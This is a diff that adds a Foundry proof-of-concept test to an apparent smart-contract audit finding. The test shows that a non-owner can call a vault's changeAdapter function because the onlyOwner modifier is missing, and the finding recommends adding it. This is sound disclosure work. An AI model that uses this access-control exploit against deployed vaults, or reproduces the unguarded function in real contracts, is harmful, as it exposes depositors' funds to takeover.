@@ -53,6 +53,38 @@ Traces:
 
 Test result: ok. 1 passed; 0 failed; finished in 3.50ms
 ```
+PoC:
+```  function test__anyoneCanChangeAdapterAfterNewWasProposed() public {
+    // Missing onlyOwner modifier allows anyone to Set a new Adapter for this Vault after the quit period has passed.
+    MockERC4626 newAdapter = new MockERC4626(IERC20(address(asset)), "Mock Token Vault", "vwTKN");
+    uint256 depositAmount = 1 ether;
+
+    // Deposit funds for testing
+    asset.mint(alice, depositAmount);
+    vm.startPrank(alice);
+    asset.approve(address(vault), depositAmount);
+    vault.deposit(depositAmount, alice);
+    vm.stopPrank();
+
+    // Increase assets in asset Adapter to check hwm and assetCheckpoint later
+    asset.mint(address(adapter), depositAmount);
+    vault.takeManagementAndPerformanceFees();
+
+    // Preparation to change the adapter
+    vault.proposeAdapter(IERC4626(address(newAdapter)));
+
+    vm.warp(block.timestamp + 3 days);
+
+    vm.expectEmit(false, false, false, true, address(vault));
+    emit ChangedAdapter(IERC4626(address(adapter)), IERC4626(address(newAdapter)));
+    
+    vm.startPrank(bob);
+    vault.changeAdapter();
+    vm.stopPrank();
+
+  }
+```
+
 Recommendation: add `onlyOwner` modifier to `changeAdapter` function and refactor `testFail__changeAdapter_NonOwner`
 
 
